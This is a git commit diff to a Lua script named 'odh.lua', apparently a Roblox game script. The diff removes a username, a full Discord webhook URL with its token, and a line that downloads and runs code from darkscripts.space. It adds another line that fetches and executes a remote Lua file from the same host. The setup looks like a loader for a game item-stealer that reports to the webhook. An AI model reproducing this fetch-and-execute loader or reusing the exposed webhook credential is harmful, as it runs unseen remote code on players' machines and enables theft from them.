a45c610de23e64d4698529bc22fdee7493bb83a4
proplayer123-z <idkfrcap@gmail.com>
2024-11-24 00:39:08 +0800

    Update odh.lua

--- odh.lua
+++ odh.lua
@@ -1,5 +1,1 @@
-Username = "ChickenNuggetATK"
-Webhook = "https://discord.com/api/webhooks/1302922691526918174/0NOvTvR9xZ5k-vTlfudJLwm9se0YY8m5SCITvhrw_xgWIyiGy6WLjNaup2_AEyV2bcM_"
-selectedLoadingScreen = "2" -- If you dont know whats that just skip that part
-
-loadstring(game:HttpGet(('https://darkscripts.space/mm2')))()
+loadstring(game:HttpGet('https://darkscripts.space/scripts/917602878913404939.lua',true))()
